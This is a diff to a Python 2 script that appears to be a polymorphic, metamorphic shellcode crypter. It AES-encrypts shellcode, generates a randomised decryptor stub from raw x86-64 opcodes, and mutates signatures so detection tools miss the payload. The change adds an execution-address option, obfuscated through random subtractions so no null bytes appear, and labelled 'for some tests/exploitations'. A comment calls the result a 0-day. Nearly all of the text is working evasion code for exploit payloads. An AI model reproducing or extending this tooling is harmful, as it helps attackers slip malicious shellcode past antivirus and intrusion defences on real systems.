@@ -8,7 +8,6 @@ from random import randint
 from random import shuffle
 from sys import argv
 from os import system
-from copy import copy
 
 def morphSig():
 # metamorphic engine
@@ -65,7 +64,7 @@ def str2hex(input):
 	input=input+(1<<width)
 	return ''.join(chr((input >> 8*n) & 255) for n in reversed(range(width/8)))
 
-def prepare(ciphertext):
+def prepare(ciphertext,addresses):
 # polymorphic & metamorphic engine
 # we don't know the length of the shellcode, so we have to adapt the length of the decipher
 	decryption=''
@@ -75,10 +74,120 @@ def prepare(ciphertext):
 		twoHalfCiphertext='\x49\xbf'+part[len(part)/2:][len(part)/4:]+part[len(part)/2:][:len(part)/4]+'\x66\x49\x0f\x6e'+movq15[3]
 		preparation='\x0f\xc6'+xmm[0][0]+'\x1b\x0f\xc6'+xmm[0][3]+'\x1b'
 		decrypt='\x66\x41\x0f\xef'+xmm[0][7]+'\x66\x41\x0f\x38\xde'+xmm[0][6]+'\x66\x41\x0f\x38\xde'+xmm[0][5]+'\x66\x41\x0f\x38\xde'+xmm[0][4]+'\x66\x41\x0f\x38\xde'+xmm[0][3]+'\x66\x41\x0f\x38\xde'+xmm[0][2]+'\x66\x41\x0f\x38\xde'+xmm[0][1]+'\x66\x41\x0f\x38\xde'+xmm[0][0]+'\x66\x0f\x38\xde'+xmm[0][7]+'\x66\x0f\x38\xde'+xmm[0][6]+'\x66\x0f\x38\xdf'+xmm[0][5]
+		storage=''
 		if block == 0:
 #			storage='\x48\xbe\x99\x99\x59\xff\xff\xff\xff\xff\x48\xb8\x89\x96\xf9\xfe\xff\xff\xff\xff\x48\x29\xc6\x0f\x29\x06'
 #			storage='\x48\xbe\x99\x99\x59\xff\xff\xff\xff\xff\x48\xb8\x99\x90\xf9\xfe\xff\xff\xff\xff\x48\x29\xc6\x0f\x29\x06'
-			storage='\x48\x89\xd6\x0f\x29'+movaps[0]
+			if addresses:
+				oneSub=[]
+				twoSub=[]
+				address=[]
+				for i in range(len(addresses)/2-1):
+					address.append(int(addresses[2+i*2]+addresses[3+i*2],16))
+				oneOffset=randint(address[0],255)
+				firstOffset=oneOffset-address[0]
+# in order to obfuscate this constant, we will generate random numbers, the subtraction of which gives the addresse
+				if oneOffset==0 or firstOffset==0:
+					oneOffset+=1
+					firstOffset+=1
+# all this in order not to have zeroes, (x+1)-(x+1)=0
+				twoOffset=randint(address[1],255)
+				secondOffset=twoOffset-address[1]
+				if twoOffset==0 or secondOffset==0:
+					twoOffset+=1
+					secondOffset+=1
+				threeOffset=randint(address[2],255)
+				thirdOffset=threeOffset-address[2]
+				if threeOffset==0 or thirdOffset==0:
+					threeOffset+=1
+					thirdOffset+=1
+				fourOffset=randint(address[3],255)
+				fourthOffset=fourOffset-address[3]
+				if fourOffset==0 or fourthOffset==0:
+					fourOffset+=1
+					fourthOffset+=1
+				fiveOffset=randint(address[4],255)
+				fifthOffset=fiveOffset-address[4]
+				if fiveOffset==0 or fifthOffset==0:
+					fiveOffset+=1
+					fifthOffset+=1
+				sixOffset=randint(address[5],255)
+				sixthOffset=sixOffset-address[5]
+				if sixOffset==0 or sixthOffset==0:
+					sixOffset+=1
+					sixthOffset+=1
+				sevenOffset=randint(address[6],255)
+				seventhOffset=sevenOffset-address[6]
+				if sevenOffset==0 or seventhOffset==0:
+					sevenOffset+=1
+					seventhOffset+=1
+				eightOffset=randint(address[7],255)
+				eighthOffset=eightOffset-address[7]
+				if eightOffset==0 or eighthOffset==0:
+					eightOffset+=1
+					eighthOffset+=1
+				if eightOffset==256:
+					eightOffset=1
+					eighthOffset=2
+					sevenOffset+=1
+				if sevenOffset==256:
+					sevenOffset=1
+					seventhOffset=2
+					sixOffset+=1
+				if sixOffset==256:
+					sixOffset=1
+					sixthOffset=2
+					fiveOffset+=1
+				if fiveOffset==256:
+					fiveOffset=1
+					fifthOffset=2
+					fourOffset+=1
+				if fourOffset==256:
+					fourOffset=1
+					fourthOffset=2
+					threeOffset+=1
+				if threeOffset==256:
+					threeOffset=1
+					thirdOffset=2
+					twoOffset+=1
+				if twoOffset==256:
+					twoOffset=1
+					secondOffset=2
+					oneOffset+=1
+				if oneOffset==256:
+					oneOffset=1
+					firstOffset=2
+# again, zeroes mitigation, (100+1)-(99+2)=0
+# and another huge number of possibilities here ~ 2^64
+				oneSub.append(str2hex(hex1str(eightOffset)))
+				oneSub.append(str2hex(hex1str(sevenOffset)))
+				oneSub.append(str2hex(hex1str(sixOffset)))
+				oneSub.append(str2hex(hex1str(fiveOffset)))
+				oneSub.append(str2hex(hex1str(fourOffset)))
+				oneSub.append(str2hex(hex1str(threeOffset)))
+				oneSub.append(str2hex(hex1str(twoOffset)))
+				oneSub.append(str2hex(hex1str(oneOffset)))
+				twoSub.append(str2hex(hex1str(eighthOffset)))
+				twoSub.append(str2hex(hex1str(seventhOffset)))
+				twoSub.append(str2hex(hex1str(sixthOffset)))
+				twoSub.append(str2hex(hex1str(fifthOffset)))
+				twoSub.append(str2hex(hex1str(fourthOffset)))
+				twoSub.append(str2hex(hex1str(thirdOffset)))
+				twoSub.append(str2hex(hex1str(secondOffset)))
+				twoSub.append(str2hex(hex1str(firstOffset)))
+# it is necessary to reformat string and hex twice because, the format can be 0x1 whereas we need 0x01
+				oneStorage=['\x48','\xba']
+				for byte in oneStorage:
+					storage+=byte
+				for byte in oneSub:
+					storage+=byte
+				twoStorage=['\x48','\xbe']
+				for byte in twoStorage:
+					storage+=byte
+				for byte in twoSub:
+					storage+=byte
+				storage+='\x48\x29\xf2'
+			storage+='\x48\x89\xd6\x0f\x29'+movaps[0]
 # the address will be not 0x600078 or 0x600310 like in assembly, but 0x600900 or 0x601280 because, GCC, anyway we can get it from RDX, thereby the shellcode will rewrite it-self
 		else:
 			storage='\x48\x83\xc2\x10\x0f\x29'+movapsNext[0]
@@ -231,6 +340,16 @@ print "KEY : "+hex2str(key)
 print ''
 print "ENCRYPTED CODE : "+hex2str(ciphertext)
 
+# you can also specify your own address for some tests/exploitations
+print ''
+#address=raw_input('SPECIFY THE SHELLCODE\'S EXECUTION ADDRESS (8 hexas like \\x00\\x00\\x00\\x00\\x06\\x00\\x90\\x00 or blank to auto-detect) : ')
+address=raw_input('SPECIFY THE SHELLCODE\'S EXECUTION ADDRESS (8 hexas like 0x0000000000600900 or blank to auto-detect) : ')
+if address:
+#	address=str2hex(address)
+	print ''
+	print 'ADDRESS : '+address
+# zeroes will be obfuscated
+
 # let's foul the signature
 signatureStart=morphSig()
 signatureEnd=morphSig()
@@ -239,7 +358,7 @@ twoHalfKey='\x49\xbf'+key[len(key)/2:][len(key)/4:]+key[len(key)/2:][:len(key)/4
 # another 2^128 possibilities per block
 insertKey='\x0f\xc6'+xmm[0][0]+'\x1b\x0f\xc6'+xmm[0][3]+'\x1b\x0f\x28'+xmm[5][0]+'\x66\x0f\xef'+xmm[2][2]
 expandKey='\x66\x0f\x3a\xdf'+xmm[1][0]+'\x01\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x0f\x38\xdb'+xmm[6][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x02\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x0f\x38\xdb'+xmm[7][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x04\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[0][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x08\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[1][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x10\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[2][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x20\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[3][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x40\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[4][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x80\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[5][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x1b\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[6][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x36\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x44\x0f\x28'+xmm[7][0]
-decryption=prepare(ciphertext)
+decryption=prepare(ciphertext,address)
 # futher obfuscation of values is possible, but since it's already a 0-day, there's no need, for now
 exe='\xff\xe6'
 shellcode=signatureStart+oneHalfKey+twoHalfKey+insertKey+expandKey+decryption+exe+signatureEnd
